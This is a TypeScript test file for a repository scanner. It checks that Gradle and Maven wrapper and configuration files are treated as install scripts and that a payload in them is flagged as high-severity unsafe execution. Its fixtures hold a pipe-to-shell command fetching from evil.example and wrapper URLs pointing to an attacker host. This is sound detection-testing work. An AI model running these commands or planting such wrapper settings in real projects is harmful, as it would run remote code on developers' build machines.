import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

/**
 * Gradle and Maven read these files on every build. The wrapper properties
 * choose the distribution and wrapper JAR that `gradlew` and `mvnw`
 * download and run; the others add JVM agents, CLI options or build
 * extensions that Maven or Gradle load into the build.
 */
const CONFIGS: [string, string][] = [
  [
    "gradle/wrapper/gradle-wrapper.properties",
    `distributionUrl=https\\://evil.example/gradle.zip\n# ${PAYLOAD}\n`,
  ],
  [
    ".mvn/wrapper/maven-wrapper.properties",
    `wrapperUrl=https://evil.example/wrapper.jar\n# ${PAYLOAD}\n`,
  ],
  ["gradle.properties", `org.gradle.jvmargs=-javaagent:a.jar\n# ${PAYLOAD}\n`],
  [".mvn/jvm.config", `-javaagent:a.jar\n# ${PAYLOAD}\n`],
  [".mvn/maven.config", `-Dexample=1\n# ${PAYLOAD}\n`],
  [".mvn/extensions.xml", `<extensions><!-- ${PAYLOAD} --></extensions>\n`],
];

test("JVM build-tool configuration is scanned as an install script", () => {
  for (const [file, text] of CONFIGS)
    for (const path of [file, `services/api/${file}`, file.toUpperCase()]) {
      expect({ path, surfaces: surfacesOf(path) }).toEqual({
        path,
        surfaces: ["installScripts", "source"],
      });
      const inspection = inspected(path, text);
      expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
        path,
        coverage: { state: "complete", items: 1 },
      });
      expect({
        path,
        findings: inspection.findings.map(
          (finding) =>
            `${finding.path}:${finding.category}:${finding.severity}`,
        ),
      }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
    }
});

test("Maven settings outside a .mvn directory keep their surfaces", () => {
  // Only `.mvn/` makes Maven read these names; elsewhere they are data.
  expect(surfacesOf("jvm.config")).toEqual([]);
  expect(surfacesOf("conf/maven.config")).toEqual([]);
  expect(surfacesOf("docs/extensions.xml")).toEqual([]);
  expect(surfacesOf("docs/gradle.properties.md")).toEqual([]);
});
